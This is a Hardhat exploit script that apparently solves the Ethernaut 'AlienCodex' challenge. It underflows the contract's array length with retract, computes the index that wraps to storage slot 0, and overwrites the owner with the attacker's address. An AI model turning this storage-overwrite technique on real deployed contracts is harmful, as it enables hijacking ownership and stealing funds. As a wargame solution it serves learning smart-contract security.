const { ethers } = require("hardhat")

const alienCodexInstanceAddress = "0x813785C165A7bE3246373Fe550f7e5219d643174"

async function main() {
  /* Get signer */

  const accounts = await ethers.getSigners()
  const deployer = accounts[0]

  /* Getting the Dex contract */

  const AlienCodex = await ethers.getContractFactory("AlienCodex")
  const alienCodex = await AlienCodex.attach(alienCodexInstanceAddress)

  /* Running the attack */

  console.log("Attacking...")

  const actualOwner = await alienCodex.owner()
  console.log("Owner of the contract is: " + actualOwner)

  const response = await ethers.provider.getStorageAt(alienCodex.address, 0)
  console.log(`Storage at address 0 is: ${response}`)

  console.log("Making contact with the contract...")
  const makingContact = await alienCodex.make_contact()
  await makingContact.wait(1)

  // It appended a 01 byte at the beginning because we made contact
  const response2 = await ethers.provider.getStorageAt(alienCodex.address, 0)
  console.log(`Storage at address 0 is: ${response2}`)

  const contacted = await alienCodex.contact()
  console.log(`Contact is set now to: ${contacted}`)

  const retract = await alienCodex.retract()
  await retract.wait(1)

  /* Calculating the right position of owner */

  const positionOne = await ethers.utils.solidityKeccak256(["uint256"], ["0x01"])
  const positionOneBigNumber = ethers.BigNumber.from(positionOne)
  const twoPoweredto256 = ethers.BigNumber.from("2").pow("256")
  // Substract positionOne to twoPoweredto256
  const index = twoPoweredto256.sub(positionOneBigNumber)

  /* Crafting the data to input in the position */

  const replacementSlot = "0x" + "0".repeat(24) + deployer.address.slice(2)

  /* Setting ourselves as owners */

  console.log("Taking control of the Alien contract")
  const revise = await alienCodex.revise(index, replacementSlot)
  await revise.wait(1)

  const response3 = await ethers.provider.getStorageAt(alienCodex.address, 0)
  console.log(`Storage at address 0 is: ${response3}`)

  console.log("Pwned!")
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error)
    process.exit(1)
  })
